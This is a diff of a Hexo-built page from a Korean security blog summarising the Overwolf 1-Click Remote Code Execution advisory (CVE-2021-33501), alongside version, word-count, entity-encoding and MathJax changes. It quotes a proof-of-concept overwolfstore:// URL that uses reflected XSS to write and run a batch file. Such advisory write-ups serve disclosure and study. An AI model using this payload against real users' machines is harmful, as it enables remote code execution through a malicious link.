@@ -61,7 +61,7 @@
   <script src="/js/utils.js"></script>
   <script src="/js/color-schema.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
 </head>
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      180 자
+      279 자
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      3
+      5
        분
     </span>
   
@@ -242,17 +242,17 @@
               </script>
               <h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://swordbytes.com/blog/security-advisory-overwolf-1-click-remote-code-execution-cve-2021-33501/">Overwolf 1-Click Remote Code Execution</a></p>
 <h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Overwolf Client 0.169.0.22</p>
-<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Overwolf는 PC 게임을 위한 확장 프로그램의 개발 프래임워크를 제공하고 유통하는 플랫폼입니다. Overwolf Store의 URL handler에 Reflected Cross-Site Scripting(XSS)을 이용한 원격 코드 실행 취약점이 발견되었습니다. </p>
-<pre><code class="hljs url">overwolfstore:&#x2F;&#x2F;app&#x2F;apps&#x2F;&lt;img src&#x3D;x onerror&#x3D;alert(document.location)&gt;&#x2F;4</code></pre>
+<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Overwolf&#xB294; PC &#xAC8C;&#xC784;&#xC744; &#xC704;&#xD55C; &#xD655;&#xC7A5; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xAC1C;&#xBC1C; &#xD504;&#xB798;&#xC784;&#xC6CC;&#xD06C;&#xB97C; &#xC81C;&#xACF5;&#xD558;&#xACE0; &#xC720;&#xD1B5;&#xD558;&#xB294; &#xD50C;&#xB7AB;&#xD3FC;&#xC785;&#xB2C8;&#xB2E4;. Overwolf Store&#xC758; URL handler&#xC5D0; Reflected Cross-Site Scripting(XSS)&#xC744; &#xC774;&#xC6A9;&#xD55C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p>
+<pre><code class="hljs url">overwolfstore://app/apps/&lt;img src=x onerror=alert(document.location)&gt;/4</code></pre>
 
-<p><code>overwolfstore://</code> Custum Scheme를 사용하면 웹브라우저를 통해 OverwolfAppstore.exe 프로세스를 실행할 수 있습니다. URL의 category에 해당하는 부분이 오류 메세지의 일부로 responce body에 reflect 되며 Overwolf Store UI의 DOM에 reflect 되므로 XSS 공격이 가능합니다.</p>
-<pre><code class="hljs url">overwolfstore:&#x2F;&#x2F;app&#x2F;apps&#x2F;&lt;img+src&#x3D;x+onerror&#x3D;%22overwolf.io.writeFileContents(&#39;C:\\windows\\temp\\d.bat&#39;,&#39;start%20cmd%20%252fk%20whoami&#39;,&#39;&#39;,false,console.log)%2526overwolf.utils.openUrlInDefaultBrowser(&#39;C:\\windows\\temp\\d.bat&#39;)%22&gt;&#x2F;CCCCCC</code></pre>
+<p><code>overwolfstore://</code> Custum Scheme&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xC6F9;&#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xB97C; &#xD1B5;&#xD574; OverwolfAppstore.exe &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. URL&#xC758; category&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC774; &#xC624;&#xB958; &#xBA54;&#xC138;&#xC9C0;&#xC758; &#xC77C;&#xBD80;&#xB85C; responce body&#xC5D0; reflect &#xB418;&#xBA70; Overwolf Store UI&#xC758; DOM&#xC5D0; reflect &#xB418;&#xBBC0;&#xB85C; XSS &#xACF5;&#xACA9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>
+<pre><code class="hljs url">overwolfstore://app/apps/&lt;img+src=x+onerror=%22overwolf.io.writeFileContents(&apos;C:\\windows\\temp\\d.bat&apos;,&apos;start%20cmd%20%252fk%20whoami&apos;,&apos;&apos;,false,console.log)%2526overwolf.utils.openUrlInDefaultBrowser(&apos;C:\\windows\\temp\\d.bat&apos;)%22&gt;/CCCCCC</code></pre>
 
-<p>위는 PoC 코드로 다음과 같은 작업을 합니다.</p>
+<p>&#xC704;&#xB294; PoC &#xCF54;&#xB4DC;&#xB85C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC791;&#xC5C5;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p>
 <ol>
-<li>누군가 악성 URL에 접속하면 Overwolf Store 응용프로그램이 실행되고 XSS 취약점 트리거.</li>
-<li><code>C:\windows\temp\</code> 폴더에 악성 batch 파일 생성.</li>
-<li>batch 파일 실행</li>
+<li>&#xB204;&#xAD70;&#xAC00; &#xC545;&#xC131; URL&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xBA74; Overwolf Store &#xC751;&#xC6A9;&#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xACE0; XSS &#xCDE8;&#xC57D;&#xC810; &#xD2B8;&#xB9AC;&#xAC70;.</li>
+<li><code>C:\windows\temp\</code> &#xD3F4;&#xB354;&#xC5D0; &#xC545;&#xC131; batch &#xD30C;&#xC77C; &#xC0DD;&#xC131;.</li>
+<li>batch &#xD30C;&#xC77C; &#xC2E4;&#xD589;</li>
 </ol>
 
             </div>
@@ -556,6 +556,45 @@
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
 
 
 
